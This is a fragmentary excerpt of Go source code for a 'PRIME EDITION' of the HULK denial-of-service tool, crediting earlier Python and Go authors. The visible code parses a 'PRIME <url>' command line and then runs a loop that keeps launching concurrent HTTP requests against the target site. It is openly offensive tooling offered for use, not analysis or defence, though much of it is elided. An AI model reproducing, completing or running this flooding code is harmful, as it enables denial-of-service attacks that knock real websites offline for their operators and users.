...
/*
 HULK DoS tool - PRIME EDITION
 Original by Barry Shteiman (Python), Ported by Alexander I.Grafov (Go)
 Now with PRIME command syntax!
*/
...
func main() {
	...
	// === PRIME SYNTAX PARSING ===
	args := flag.Args()
	if len(args) < 2 || strings.ToUpper(args[0]) != "PRIME" {
		fmt.Println("Usage: ./hulk PRIME <url> [GET/POST] [--flags]")
		os.Exit(1)
	}
	site := args[1]
	method := "GET"
	...
	go func() {
		fmt.Println("—PRIME ATTACK STARTED—\n           Go!\n\n")
		...
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, method, data, headers, ss)
			}
			if sent%10 == 0 {
...
func httpcall(url, host, method, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)
